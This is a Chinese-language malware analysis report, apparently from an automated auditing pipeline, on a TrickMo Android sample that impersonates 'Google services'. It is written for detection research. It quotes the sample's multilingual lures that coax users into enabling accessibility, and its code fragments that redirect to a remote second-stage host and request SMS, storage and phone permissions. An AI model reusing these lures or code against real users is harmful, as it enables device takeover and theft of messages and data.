# MB_135__17fc5d1c8b｜TrickMo — Google services

> **类型**：在野恶意无障碍样本  ｜  **来源池**：`MalwareBazaar_2022_2026`  ｜  **静态可见性**：`partial_dynamic_or_remote`  ｜  **APKAudit 耗时**：202.0s

## 1. 一句话核心结论

- **核心申请方式**：以「Google services」为桌面名与无障碍服务名，用本地多语言 HTML 分步教学页（设置→已下载服务→为 Google Play services 开启）+ 一键 openAccessibilitySettings 桥接骗取全能力无障碍服务，获权后立即跳转远端 smartclickhub.eu 并索取短信/存储/电话权限与忽略电池优化。
- **静态可见性说明**：引导文案与跳转调用完整静态可见（assets/www/index.html 可读，含多语言分步文案与 openAccessibilitySettings 桥接调用）；但 classes.dex 与全部 assets 条目在 ZIP 目录中被置加密标志，DEX 仅暴露 com.hazard.fence.Ismartround/Jventuredrastic 两个混淆类，无障碍服务实现类、跳转 Activity 与取消回调逻辑不可静态还原；assets/aHsPU.json（5.1MB）为高熵密文，字符串解密依赖 libs/libcrashyltics.so（ZoeUtils_decodeStringNative 等）；获权后跳转的远端页面 smartclickhub.eu/error/ 内容属运行期远端下发，静态不可见。
- **命中的行为模式标签**：`TRIG_COLD_START_BLOCK`（冷启动0步强阻断直弹授权）、`CARRIER_WEBVIEW_LOCAL_HTML`（本地离线HTML/WebView引导页）、`CARRIER_SYSTEM_A11Y_DESCRIPTION`（系统无障碍列表服务说明(android:description)）、`LURE_FAKE_UPDATE_OR_INSTALL`（假系统/应用更新或插件安装胁迫）、`LURE_RESTRICTED_SETTINGS_COACHING`（Android 13+受限设置分步解锁教学(应用信息→右上角菜单)）、`COERCE_NO_SKIP_NON_CANCELABLE`（不可取消弹窗/无跳过出口/单一正向按钮）、`ID_SYSTEM_OR_BRAND_IMPERSONATION`（冒充系统组件/Google/大厂或银行品牌身份）、`ID_MULTI_ALIAS_CAMOUFLAGE`（多activity-alias动态切换图标与伪装身份）、`ID_FAKE_IS_ACCESSIBILITY_TOOL`（伪造android:isAccessibilityTool="true"）、`STATIC_PACKED_OR_ENCRYPTED_PAYLOAD`（强加壳/VMP/AES密文或远端载荷致静态遮蔽）

## 2. 应用标识、静态能力与身份署名核验

| 维度 | 实测详情 |
| --- | --- |
| 样本 SHA-256 | `17fc5d1c8bd8b10471131282e42ec289bb1e1ee107ca676f369bb42fc3643af3` |
| 包名 / 年份 | `centtem.houe948.ov` / 2025 |
| 家族 / 品类 | **TrickMo**（同池样本数：8） |
| 原始来源标识 | MalwareBazaar_2022_2026 |
| 桌面显示名 | Google services |
| 引导页宣称品牌/身份 | Google / Google Play services（页面 step_3 明确写 Activate services for the Google Play services，app_title 变量硬编码为 'Google services'） |
| 系统无障碍列表服务名 | Google services（android:label=@7F0E001C，与桌面名同一资源；android:description 为空） |
| 三方身份是否错配/伪装 | **是（存在伪装/错配）** ｜ 混淆手法：1) 无障碍服务 android:description 为空，系统列表仅显示名称、无任何用途说明；2) 服务名与桌面名复用同一字符串资源 @7F0E001C，强化「系统级 Google 组件」观感；3) 显示名与页面宣称对象不一致（Google services vs Google Play services）；4) 无障碍服务类名、引导 Activity 全部为随机大小写混淆（JJLg9J3H9dOTlJFkNh、FYbtu4nN、vwNxNJYASd 等），并声明多个 excludeFromRecents/noHistory 的 activity-alias 式隐藏壳 Activity；5) accessibilityservice.xml 中声明了 isAccessibilityTool 属性（值未能静态确认），存在伪造系统工具标记的可能；6) 包内 classes.dex 与 assets 条目在 ZIP 目录中设置加密标志以阻碍常规解包。 |
| 无障碍服务类名 | `centtem.houe948.ov.JJLg9J3H9dOTlJFkNh` |
| 静态能力位 | `canRetrieveWindowContent=False` · `canPerformGestures=False` · `isAccessibilityTool=False` · 监听范围：全局通配（未限定 packageNames） |
| 共现高危权限 | `CALL_PHONE, CAMERA, PACKAGE_USAGE_STATS, PROCESS_OUTGOING_CALLS, QUERY_ALL_PACKAGES, READ_CONTACTS, READ_SMS, RECEIVE_SMS, RECORD_AUDIO, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, REQUEST_INSTALL_PACKAGES, SEND_SMS, SYSTEM_ALERT_WINDOW, WRITE_SETTINGS` |

## 3. 一步步引导用户申请/开启无障碍流程（Pre-Grant UTG 全链路）

| 步骤 | 阶段 | 页面 / 组件 | 触发事件 | UI 载体 | 界面呈现原文与译文 | 要求用户执行的动作 | 代码/资源锚点 |
| :---: | --- | --- | --- | --- | --- | --- | --- |
| 1 | 冷启动入口 | com.hazard.fence.Ismartround（Application）→ 加密 DEX 中的主入口 Activity（不可静态还原） | 进程启动 onCreate/attachBaseContext，加载 assets/aHsPU.json 密文并初始化解密 | 不可静态还原 | 无 | 无（自动执行） | `com.hazard.fence.Ismartround.attachBaseContext / onCreate` |
| 2 | 引导说明页 | 本地 HTML 引导页 assets/www/index.html，承载于应用内 WebView（JS 桥对象名为 android） | 页面 DOMContentLoaded：先执行 android.startPushService()，再判断 android.isAccessibilityServiceEnabled()，未开启则隐藏 spinner、显示 main-content 引导正文 | 本地HTML WebView | **原文**：Activate Accessibility services for the correct application work. / Step 1. - Go to Settings / Step 2. - Open "Downloaded Services" / Step 3. - Activate services for the Google Play services / Go to Settings<br>**译注**：为让应用正常工作，请启用无障碍服务。第 1 步：进入设置；第 2 步：打开「已下载的服务」；第 3 步：为 Google Play services 启用服务。按钮：前往设置 | 按三步指引前往设置并为「Google Play services」开启无障碍；页面仅提供单一「Go to Settings」按钮，无跳过/取消按钮 | `assets/www/index.html（多语言 switch 块 step_1/step_2/step_2_xiaomi/step_2_samsung/step_3/btn1，DOMContentLoaded 检查脚本）` |
| 3 | 跳无障碍设置 | 系统设置 → 无障碍 → 已下载/已安装的服务页（由宿主 App 的 JS 桥实现拉起） | 用户点击引导页绿色按钮 #btn1，onclick 触发 android.openAccessibilitySettings(true) | 系统无障碍页 | **原文**：onclick="android.openAccessibilitySettings(true)"<br>**译注**：点击「前往设置」直接跳转系统无障碍设置页 | 在系统设置中手动找到并开启该服务开关 | `assets/www/index.html 中 id="btn1" 按钮 onclick 调用 android.openAccessibilitySettings` |
| 4 | 遮罩叠层指引 | 系统无障碍服务列表项 centtem.houe948.ov.JJLg9J3H9dOTlJFkNh | 用户进入系统无障碍已下载服务列表 | 系统无障碍页 | **原文**：Google services（android:label=@7F0E001C；android:description 为空）<br>**译注**：系统无障碍列表中该项显示为「Google services」，且无任何用途说明文字 | 点击该条目并打开开关（用户此时无法从描述判断真实用途） | `AndroidManifest.xml 中 service centtem.houe948.ov.JJLg9J3H9dOTlJFkNh（permission=BIND_ACCESSIBILITY_SERVICE）+ res/xml/accessibilityservice.xml` |
| 5 | 获权后动作 | WebView 跳转至远端 https://smartclickhub.eu/error/ ，由 assets/www/inject.js 接管 | android.isAccessibilityServiceEnabled() 返回 true 后执行 window.location.href = "https://smartclickhub.eu/error/"；页面加载后 inject.js 检测 URL 含 error 即触发权限申请 | 远端WebView | **原文**：window.location.href = "https://smartclickhub.eu/error/"; android.requestPermissions(['android.permission.WRITE_EXTERNAL_STORAGE', 'android.permission.READ_EXTERNAL_STORAGE', 'android.permission.READ_SMS', 'android.permission.RECEIVE_SMS', 'android.permission.READ_PHONE_STATE']); android.requestIgnoreBatteryOptimizations();<br>**译注**：无障碍一旦开启即跳转远端错误页，并连续索取存储、短信读取/接收、电话状态权限，同时在 5 秒与 10 秒后两次请求忽略电池优化 | 在弹出的系统权限对话框中逐项允许；无视电池优化提示 | `assets/www/inject.js（DOMContentLoaded + includes("error") 分支）；assets/www/index.html 中 isAccessibilityServiceEnabled 判断块` |

## 4. 引导文字呈现位置与逐字原文摘录

### 4.1 呈现位置清单（Where Text Appears）
- 应用内 WebView 加载的本地页面 assets/www/index.html 正文（多语言 switch 生成的 foAccess 段落与 step_1/step_2/step_3 三行分步教学，正文区 id="p1"）
- 同一本地页面底部绿色按钮 #btn1，文案随语言为 Go to Settings / Gehe zu den Einstellungen / Aller aux paramètres / Aceptar y continuar，点击即调 android.openAccessibilitySettings(true)
- 系统无障碍设置「已下载的服务」列表中该服务的名称项：显示 Google services（android:label=@7F0E001C），android:description 为空，无用途说明
- 桌面/应用列表图标名称：Google services（Manifest application label 与无障碍服务 label 为同一字符串资源）
- 获权后跳转的远端页面 https://smartclickhub.eu/error/ （内容运行期远端下发，静态不可见），该页由 assets/www/inject.js 注入权限索取脚本

### 4.2 逐字原文与话术框架（Verbatim Texts）
| 语种 | 逐字原文 | 中文翻译 | 源码/资源位置 | 话术/修辞框架 |
| :---: | --- | --- | --- | --- |
| en | Activate Accessibility services for the correct application work. | 请启用无障碍服务，以便应用正常工作。 | `assets/www/index.html 内联 script 的 default（英文）分支变量 foAccess` | 受限设置分步教学 |
| en | Step 1. - Go to Settings | 第 1 步：进入设置。 | `assets/www/index.html default 分支变量 step_1` | 受限设置分步教学 |
| en | Step 2. - Open "Downloaded Services" | 第 2 步：打开「已下载的服务」。 | `assets/www/index.html default 分支变量 step_2（另有 step_2_xiaomi="Step 2. - Open \"Downloaded apps\""、step_2_samsung="Step 2. - Open \"Installed apps\""）` | 受限设置分步教学 |
| en | Step 3. - Activate services for the <a>Google Play services</a> | 第 3 步：为 Google Play services 启用服务。 | `assets/www/index.html default 分支变量 step_3（app_title 硬编码为 'Google services'）` | 假更新 |
| en | Go to Settings | 前往设置。 | `assets/www/index.html default 分支变量 btn1（按钮 #btn1，onclick=android.openAccessibilitySettings(true)）` | 受限设置分步教学 |
| es | Activar los servicios de accesibilidad para el correcto funcionamiento de la aplicación. / Paso 1. - Ve a Configuración / Paso 2. - Abra el menú "Servicios descargados" / Paso 3. - Activar servicios para <a>Google services</a> / Aceptar y continuar | 为让应用正常运行，请启用无障碍服务。第 1 步：进入设置；第 2 步：打开「已下载的服务」菜单；第 3 步：为 Google services 启用服务。按钮：接受并继续。 | `assets/www/index.html switch 的 case "es" 分支` | 受限设置分步教学 |
| fr | Activez les services d'accessibilité pour les travaux d'application corrects. / Étape 1. - Accédez aux paramètres / Étape 2. - Ouvrez le menu "Services téléchargés" / Étape 3. - Activer les services pour <a>Google Play services</a> / Aller aux paramètres | 请启用无障碍服务以保证应用正常工作。第 1 步：进入设置；第 2 步：打开「已下载的服务」菜单；第 3 步：为 Google Play services 启用服务。按钮：前往设置。 | `assets/www/index.html switch 的 case "fr" 分支` | 受限设置分步教学 |
| de | Aktivieren Sie Barrierefreiberdienste für die richtige Anwendungsarbeit. / Schritt 1. - Gehen Sie zu Einstellungen / Schritt 2. - Öffnen Sie das Menü "Installierte Apps" / Schritt 3. - Aktivieren Sie die Dienste für den <a>Google services</a> / Gehe zu den Einstellungen | 请启用无障碍服务以保证应用正常工作。第 1 步：进入设置；第 2 步：打开「已安装的应用」菜单；第 3 步：为 Google services 启用服务。按钮：前往设置。 | `assets/www/index.html switch 的 case "de" 分支` | 受限设置分步教学 |
| en | This component provides core functionality like authentication to your Google services, synchronized contacts, access to all the latest user | 该组件为你的 Google 服务提供身份验证、联系人同步、访问最新用户数据等核心功能。 | `resources.arsc 字符串资源（预筛线索 DEFAULT 字符串，用于强化 Google 组件观感）` | 假更新 |

## 5. 让用户完成开启的具体机制与拒权反馈

- **触发时机（Trigger Timing）**：`shallow_1_step`
- **是否提供取消/跳过出口**：`False`
- **拒权或返回后的反馈回路**：引导页每次 DOMContentLoaded 都会重新判断 android.isAccessibilityServiceEnabled()，未开启即再次渲染同一分步教学并再次暴露「Go to Settings」按钮，用户返回后仍停留在该页可被反复引导；inject.js 中另有 android.setVar("ACB_Cancel","go") 向宿主下发取消控制变量，表明宿主对返回/取消有专门回调处理，但该回调位于加密 DEX 中，无法静态确认是否构成返回即重跳的死循环。未发现静态可见的定时器强制拉起无障碍设置页。
- **遮罩叠层 / 高仿系统设置页**：未发现半透明引导遮罩或高仿系统无障碍开关页；引导以本地 HTML 页 + 直接跳转真实系统设置页实现，未做叠层伪装。但 Manifest 中声明了 SYSTEM_ALERT_WINDOW 权限与多个 excludeFromRecents/noHistory 的隐藏壳 Activity，具备运行期叠层能力（具体使用需动态验证）。
- **Android 13+ 受限设置（Restricted Settings）应对**：无（页面仅教学进入「设置→已下载/已安装的服务」开启无障碍，未涉及 Android 13+ 应用详情页右上角菜单允许受限设置，也未涉及 Session 安装器绕过）
- **获权后即时行为与防撤权机制**：获权后无静态可见的自点确认或 GLOBAL_ACTION_BACK/HOME 阻止撤权代码；但获权即刻跳转远端 smartclickhub.eu/error/ 并索取短信/存储/电话权限、两次请求忽略电池优化，且无障碍服务声明了 canPerformGestures/canRequestFilterKeyEvents/canTakeScreenshot，运行期具备手势拦截与返回键过滤能力（实际反撤权逻辑位于加密载荷，未静态确认）。
- **良性降级 / 替代方案**：无

## 6. 面向纯 UTG 检测机制的关键捕获页面与判别信号

- **推荐检测拉起时机（Trigger Hook）**：监测到应用拉起 Intent 目标为 android.settings.ACCESSIBILITY_SETTINGS（或 Settings$AccessibilitySettingsActivity）的瞬间即拉起 UTG；其次在应用内 WebView 首次出现「Step 1. - Go to Settings / Step 2. - Open "Downloaded Services"」文本时提前抓取，以记录跳转前教学页与按钮原文。
- **是否需对纯图/GIF 引导页触发按需单帧 OCR**：`False`
- **纯 UTG 方案盲区/边界提示**：存在两处盲区：其一，classes.dex 与全部 assets 条目在 ZIP 目录中被置加密标志、assets/aHsPU.json（5.1MB）为高熵密文、字符串解密由 libs/libcrashyltics.so 承担，导致无障碍服务的实际自动化行为、入口 Activity 与 ACB_Cancel 取消回调逻辑静态不可还原，需运行期 UTG + 无障碍事件监控补齐；其二，获权后跳转的 smartclickhub.eu 页面为远端下发，静态完全不可见，需动态抓包与录屏。引导页本身为纯文本（无纯图空文本诱导），不需要 OCR。

| 关键捕获页面角色 | 预期页面/组件标识 | 为何捕获该页面最有用 | 可在 UTG 直接提取的判别信号 |
| --- | --- | --- | --- |
| **冷启动后本地 HTML 引导教学页（跳转前 WebView 页）** | 应用内 WebView，页面顶部 Google 服务图标 + 正文含「Activate Accessibility services」与 Step 1/2/3 三行分步文案，底部绿色「Go to Settings」按钮 | 这是整个诱导链唯一的静态可读文本载体，直接呈现「伪装 Google + 分步教学 + 单一强制按钮」三要素，是判定诱导而非良性说明的决定性页面 | 页面标题/正文含 Accessibility services 与 Step 1./Step 2./Step 3. 结构化文案；按钮文案为 Go to Settings 且页面无「取消/跳过/稍后」控件；Step 3 中的品牌锚点文本为 Google Play services，与桌面名 Google services 不一致；页面加载后已出现 android.startPushService 触发的长连行为 |
| **系统无障碍服务列表项（真实系统页，非伪造）** | 设置 → 无障碍 → 已下载的服务 列表中的「Google services」条目 | 用于核实服务显示名与桌面名同源、且无 description 说明，构成身份混淆的直接证据；也用于确认跳转确实落在真实系统页而非高仿页 | 列表项名称恰为 Google services 且无副标题用途说明；包名归属为 centtem.houe948.ov 而非 com.google.*；开关状态在用户操作前后发生翻转 |
| **获权后远端二阶段页（smartclickhub.eu/error/）** | WebView 跳转至 smartclickhub.eu 域名，页面随后连续弹出存储/短信/电话状态权限对话框与电池优化提示 | 证实无障碍授权是进入二阶段的触发开关（isAccessibilityServiceEnabled 为真才跳转），把「骗权限」与后续短信/存储窃取串成完整链路 | 无障碍开关翻转后 WebView URL 变为 smartclickhub.eu/error/；页面加载后 1 秒内出现 READ_SMS/RECEIVE_SMS 权限请求弹窗；5 秒与 10 秒出现两次忽略电池优化系统对话框 |

## 7. 代码锚点与 APKAudit 原始完整逆向纪要

- `com.hazard.fence.Ismartround#attachBaseContext`
- `assets/www/index.html（#btn1 onclick=android.openAccessibilitySettings(true)；DOMContentLoaded 中 isAccessibilityServiceEnabled 判断与 step_1/step_2/step_3/foAccess 多语言变量）`
- `assets/www/inject.js（includes("error") 分支 → android.requestPermissions / android.requestIgnoreBatteryOptimizations）`
- `AndroidManifest.xml service centtem.houe948.ov.JJLg9J3H9dOTlJFkNh（android:label=@7F0E001C，android:description 空）`
- `res/xml/accessibilityservice.xml（canRetrieveWindowContent/canPerformGestures/canRequestFilterKeyEvents/canTakeScreenshot 全能力声明）`
- `libs/libcrashyltics.so Java_androidx_appcompat_widget_ZoeUtils_decodeStringNative`

<details>
<summary>点击展开 APKAudit CLI 原始完整审计输出</summary>

## 分析结论

**证据可读性（关键前提）**：该 APK 为经过改动的结构：`classes.dex` 与全部 `assets/*` 条目在 ZIP 中央目录中被置上加密标志，但实际数据仍可读取（`classes.dex` 仅 37 KB，只含 `com.hazard.fence.Ismartround`、`Jventuredrastic` 两个混淆类），5.1 MB 的 `assets/aHsPU.json` 为高熵密文，字符串解密由 `libs/libcrashyltics.so` 的 `Java_androidx_appcompat_widget_ZoeUtils_decode*Native` 导出承担。因此，**无障碍服务的真实实现类、跳转 Activity 与远端二阶段页面无法静态还原**，但**引导文案载体 `assets/www/index.html` 完整可读**，足以闭合本问题的引导链。

**引导链（运行期页面流转）**

1. **冷启动**：`Application` 为 `com.hazard.fence.Ismartround`（含 `attachBaseContext`，并引用 `aHsPU.json` 密文），真实入口 Activity 被隐藏。
2. **本地 WebView 引导页**：`assets/www/index.html`（239 KB 本地 HTML，非远端）承载全部引导文案；`DOMContentLoaded` 时先判断 `android.isAccessibilityServiceEnabled()`，未开启则展示正文并 `android.startPushService()`。
3. **分步教学文案**：`Step 1. - Go to Settings` → `Step 2. - Open "Downloaded Services"`（按 `is_xiaomi`/`is_samsung` 切换为 "Downloaded apps"/"Installed apps"）→ `Step 3. - Activate services for the <a>Google Play services</a>`，并附绿色按钮 `Go to Settings`。
4. **一键跳转**：按钮 `#btn1` 绑定 `onclick="android.openAccessibilitySettings(true)"`，通过 JS 桥直接拉起系统无障碍设置页。
5. **系统无障碍列表**：服务 `centtem.houe948.ov.JJLg9J3H9dOTlJFkNh` 的 `android:label` 与桌面名同为 `@7F0E001C`（"Google services"），`android:description` 为空，用户在列表里看到的是仿冒 Google 的条目，而页面却让用户为 "Google Play services" 开启。
6. **获权后**：`isAccessibilityServiceEnabled()` 为真即 `window.location.href = "https://smartclickhub.eu/error/"` 转入远端二阶段；该页 `inject.js` 立刻 `requestPermissions([WRITE/READ_EXTERNAL_STORAGE, READ_SMS, RECEIVE_SMS, READ_PHONE_STATE])`，并在 5s/10s 两次 `requestIgnoreBatteryOptimizations()`。

**身份不符与能力越界**：显示名、无障碍服务名均为 "Google services"，宣称对象却是 "Google Play services"；`res/xml/accessibilityservice.xml` 声明 `canRetrieveWindowContent`、`canPerformGestures`、`canRequestFilterKeyEvents`、`canTakeScreenshot`、`canRequestFingerprintGestures` 等全能力，与"Google 服务可用性"这一说法明显不符。

**拒绝授权的反馈**：`inject.js` 通过 `android.setVar("ACB_Cancel","go")` 下发取消控制变量，说明宿主对用户返回键/取消行为有专门的回调处理；但该回调逻辑位于加密 DEX 中，无法静态确认是否存在"返回即重跳"的死循环，因此仅能确认引导页本身**无跳过/取消按钮**，且每次页面重建都会重新展示同一引导。

**盲区**：`classes.dex` 及全部 assets 条目标记加密、`aHsPU.json` 为密文，因此无障碍服务的实际自动化行为与远端 `smartclickhub.eu` 页面内容未静态还原。

```json
{
  "static_visibility": "partial_dynamic_or_remote",
  "visibility_note": "引导文案与跳转调用完整静态可见（assets/www/index.html 可读，含多语言分步文案与 openAccessibilitySettings 桥接调用）；但 classes.dex 与全部 assets 条目在 ZIP 目录中被置加密标志，DEX 仅暴露 com.hazard.fence.Ismartround/Jventuredrastic 两个混淆类，无障碍服务实现类、跳转 Activity 与取消回调逻辑不可静态还原；assets/aHsPU.json（5.1MB）为高熵密文，字符串解密依赖 libs/libcrashyltics.so（ZoeUtils_decodeStringNative 等）；获权后跳转的远端页面 smartclickhub.eu/error/ 内容属运行期远端下发，静态不可见。",
  "summary_one_liner": "以「Google services」为桌面名与无障碍服务名，用本地多语言 HTML 分步教学页（设置→已下载服务→为 Google Play services 开启）+ 一键 openAccessibilitySettings 桥接骗取全能力无障碍服务，获权后立即跳转远端 smartclickhub.eu 并索取短信/存储/电话权限与忽略电池优化。",
  "disguise_identity": {
    "app_display_name": "Google services",
    "claimed_brand_or_persona": "Google / Google Play services（页面 step_3 明确写 Activate services for the Google Play services，app_title 变量硬编码为 'Google services'）",
    "a11y_service_label": "Google services（android:label=@7F0E001C，与桌面名同一资源；android:description 为空）",
    "identity_mismatch": true,
    "obfuscation_tricks": "1) 无障碍服务 android:description 为空，系统列表仅显示名称、无任何用途说明；2) 服务名与桌面名复用同一字符串资源 @7F0E001C，强化「系统级 Google 组件」观感；3) 显示名与页面宣称对象不一致（Google services vs Google Play services）；4) 无障碍服务类名、引导 Activity 全部为随机大小写混淆（JJLg9J3H9dOTlJFkNh、FYbtu4nN、vwNxNJYASd 等），并声明多个 excludeFromRecents/noHistory 的 activity-alias 式隐藏壳 Activity；5) accessibilityservice.xml 中声明了 isAccessibilityTool 属性（值未能静态确认），存在伪造系统工具标记的可能；6) 包内 classes.dex 与 assets 条目在 ZIP 目录中设置加密标志以阻碍常规解包。"
  },
  "step_by_step_flow": [
    {
      "step": 1,
      "stage": "冷启动入口",
      "screen_or_component": "com.hazard.fence.Ismartround（Application）→ 加密 DEX 中的主入口 Activity（不可静态还原）",
      "trigger_event": "进程启动 onCreate/attachBaseContext，加载 assets/aHsPU.json 密文并初始化解密",
      "ui_carrier": "不可静态还原",
      "shown_text_verbatim": "无",
      "shown_text_zh": "冷启动阶段无可见文案，入口 Activity 隐藏在加密 DEX 中",
      "user_action_requested": "无（自动执行）",
      "code_anchor": "com.hazard.fence.Ismartround.attachBaseContext / onCreate"
    },
    {
      "step": 2,
      "stage": "引导说明页",
      "screen_or_component": "本地 HTML 引导页 assets/www/index.html，承载于应用内 WebView（JS 桥对象名为 android）",
      "trigger_event": "页面 DOMContentLoaded：先执行 android.startPushService()，再判断 android.isAccessibilityServiceEnabled()，未开启则隐藏 spinner、显示 main-content 引导正文",
      "ui_carrier": "本地HTML WebView",
      "shown_text_verbatim": "Activate Accessibility services for the correct application work. / Step 1. - Go to Settings / Step 2. - Open \"Downloaded Services\" / Step 3. - Activate services for the Google Play services / Go to Settings",
      "shown_text_zh": "为让应用正常工作，请启用无障碍服务。第 1 步：进入设置；第 2 步：打开「已下载的服务」；第 3 步：为 Google Play services 启用服务。按钮：前往设置",
      "user_action_requested": "按三步指引前往设置并为「Google Play services」开启无障碍；页面仅提供单一「Go to Settings」按钮，无跳过/取消按钮",
      "code_anchor": "assets/www/index.html（多语言 switch 块 step_1/step_2/step_2_xiaomi/step_2_samsung/step_3/btn1，DOMContentLoaded 检查脚本）"
    },
    {
      "step": 3,
      "stage": "跳无障碍设置",
      "screen_or_component": "系统设置 → 无障碍 → 已下载/已安装的服务页（由宿主 App 的 JS 桥实现拉起）",
      "trigger_event": "用户点击引导页绿色按钮 #btn1，onclick 触发 android.openAccessibilitySettings(true)",
      "ui_carrier": "系统无障碍页",
      "shown_text_verbatim": "onclick=\"android.openAccessibilitySettings(true)\"",
      "shown_text_zh": "点击「前往设置」直接跳转系统无障碍设置页",
      "user_action_requested": "在系统设置中手动找到并开启该服务开关",
      "code_anchor": "assets/www/index.html 中 id=\"btn1\" 按钮 onclick 调用 android.openAccessibilitySettings"
    },
    {
      "step": 4,
      "stage": "遮罩叠层指引",
      "screen_or_component": "系统无障碍服务列表项 centtem.houe948.ov.JJLg9J3H9dOTlJFkNh",
      "trigger_event": "用户进入系统无障碍已下载服务列表",
      "ui_carrier": "系统无障碍页",
      "shown_text_verbatim": "Google services（android:label=@7F0E001C；android:description 为空）",
      "shown_text_zh": "系统无障碍列表中该项显示为「Google services」，且无任何用途说明文字",
      "user_action_requested": "点击该条目并打开开关（用户此时无法从描述判断真实用途）",
      "code_anchor": "AndroidManifest.xml 中 service centtem.houe948.ov.JJLg9J3H9dOTlJFkNh（permission=BIND_ACCESSIBILITY_SERVICE）+ res/xml/accessibilityservice.xml"
    },
    {
      "step": 5,
      "stage": "获权后动作",
      "screen_or_component": "WebView 跳转至远端 https://smartclickhub.eu/error/ ，由 assets/www/inject.js 接管",
      "trigger_event": "android.isAccessibilityServiceEnabled() 返回 true 后执行 window.location.href = \"https://smartclickhub.eu/error/\"；页面加载后 inject.js 检测 URL 含 error 即触发权限申请",
      "ui_carrier": "远端WebView",
      "shown_text_verbatim": "window.location.href = \"https://smartclickhub.eu/error/\"; android.requestPermissions(['android.permission.WRITE_EXTERNAL_STORAGE', 'android.permission.READ_EXTERNAL_STORAGE', 'android.permission.READ_SMS', 'android.permission.RECEIVE_SMS', 'android.permission.READ_PHONE_STATE']); android.requestIgnoreBatteryOptimizations();",
      "shown_text_zh": "无障碍一旦开启即跳转远端错误页，并连续索取存储、短信读取/接收、电话状态权限，同时在 5 秒与 10 秒后两次请求忽略电池优化",
      "user_action_requested": "在弹出的系统权限对话框中逐项允许；无视电池优化提示",
      "code_anchor": "assets/www/inject.js（DOMContentLoaded + includes(\"error\") 分支）；assets/www/index.html 中 isAccessibilityServiceEnabled 判断块"
    }
  ],
  "text_presentation_locations": [
    "应用内 WebView 加载的本地页面 assets/www/index.html 正文（多语言 switch 生成的 foAccess 段落与 step_1/step_2/step_3 三行分步教学，正文区 id=\"p1\"）",
    "同一本地页面底部绿色按钮 #btn1，文案随语言为 Go to Settings / Gehe zu den Einstellungen / Aller aux paramètres / Aceptar y continuar，点击即调 android.openAccessibilitySettings(true)",
    "系统无障碍设置「已下载的服务」列表中该服务的名称项：显示 Google services（android:label=@7F0E001C），android:description 为空，无用途说明",
    "桌面/应用列表图标名称：Google services（Manifest application label 与无障碍服务 label 为同一字符串资源）",
    "获权后跳转的远端页面 https://smartclickhub.eu/error/ （内容运行期远端下发，静态不可见），该页由 assets/www/inject.js 注入权限索取脚本"
  ],
  "verbatim_texts": [
    {
      "lang": "en",
      "text_verbatim": "Activate Accessibility services for the correct application work.",
      "text_zh": "请启用无障碍服务，以便应用正常工作。",
      "source_location": "assets/www/index.html 内联 script 的 default（英文）分支变量 foAccess",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "en",
      "text_verbatim": "Step 1. - Go to Settings",
      "text_zh": "第 1 步：进入设置。",
      "source_location": "assets/www/index.html default 分支变量 step_1",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "en",
      "text_verbatim": "Step 2. - Open \"Downloaded Services\"",
      "text_zh": "第 2 步：打开「已下载的服务」。",
      "source_location": "assets/www/index.html default 分支变量 step_2（另有 step_2_xiaomi=\"Step 2. - Open \\\"Downloaded apps\\\"\"、step_2_samsung=\"Step 2. - Open \\\"Installed apps\\\"\"）",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "en",
      "text_verbatim": "Step 3. - Activate services for the <a>Google Play services</a>",
      "text_zh": "第 3 步：为 Google Play services 启用服务。",
      "source_location": "assets/www/index.html default 分支变量 step_3（app_title 硬编码为 'Google services'）",
      "rhetorical_frame": "假更新"
    },
    {
      "lang": "en",
      "text_verbatim": "Go to Settings",
      "text_zh": "前往设置。",
      "source_location": "assets/www/index.html default 分支变量 btn1（按钮 #btn1，onclick=android.openAccessibilitySettings(true)）",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "es",
      "text_verbatim": "Activar los servicios de accesibilidad para el correcto funcionamiento de la aplicación. / Paso 1. - Ve a Configuración / Paso 2. - Abra el menú \"Servicios descargados\" / Paso 3. - Activar servicios para <a>Google services</a> / Aceptar y continuar",
      "text_zh": "为让应用正常运行，请启用无障碍服务。第 1 步：进入设置；第 2 步：打开「已下载的服务」菜单；第 3 步：为 Google services 启用服务。按钮：接受并继续。",
      "source_location": "assets/www/index.html switch 的 case \"es\" 分支",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "fr",
      "text_verbatim": "Activez les services d'accessibilité pour les travaux d'application corrects. / Étape 1. - Accédez aux paramètres / Étape 2. - Ouvrez le menu \"Services téléchargés\" / Étape 3. - Activer les services pour <a>Google Play services</a> / Aller aux paramètres",
      "text_zh": "请启用无障碍服务以保证应用正常工作。第 1 步：进入设置；第 2 步：打开「已下载的服务」菜单；第 3 步：为 Google Play services 启用服务。按钮：前往设置。",
      "source_location": "assets/www/index.html switch 的 case \"fr\" 分支",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "de",
      "text_verbatim": "Aktivieren Sie Barrierefreiberdienste für die richtige Anwendungsarbeit. / Schritt 1. - Gehen Sie zu Einstellungen / Schritt 2. - Öffnen Sie das Menü \"Installierte Apps\" / Schritt 3. - Aktivieren Sie die Dienste für den <a>Google services</a> / Gehe zu den Einstellungen",
      "text_zh": "请启用无障碍服务以保证应用正常工作。第 1 步：进入设置；第 2 步：打开「已安装的应用」菜单；第 3 步：为 Google services 启用服务。按钮：前往设置。",
      "source_location": "assets/www/index.html switch 的 case \"de\" 分支",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "en",
      "text_verbatim": "This component provides core functionality like authentication to your Google services, synchronized contacts, access to all the latest user",
      "text_zh": "该组件为你的 Google 服务提供身份验证、联系人同步、访问最新用户数据等核心功能。",
      "source_location": "resources.arsc 字符串资源（预筛线索 DEFAULT 字符串，用于强化 Google 组件观感）",
      "rhetorical_frame": "假更新"
    }
  ],
  "how_user_is_guided_to_enable": {
    "trigger_timing": "shallow_1_step",
    "has_cancel_or_skip": false,
    "refusal_loop_mechanism": "引导页每次 DOMContentLoaded 都会重新判断 android.isAccessibilityServiceEnabled()，未开启即再次渲染同一分步教学并再次暴露「Go to Settings」按钮，用户返回后仍停留在该页可被反复引导；inject.js 中另有 android.setVar(\"ACB_Cancel\",\"go\") 向宿主下发取消控制变量，表明宿主对返回/取消有专门回调处理，但该回调位于加密 DEX 中，无法静态确认是否构成返回即重跳的死循环。未发现静态可见的定时器强制拉起无障碍设置页。",
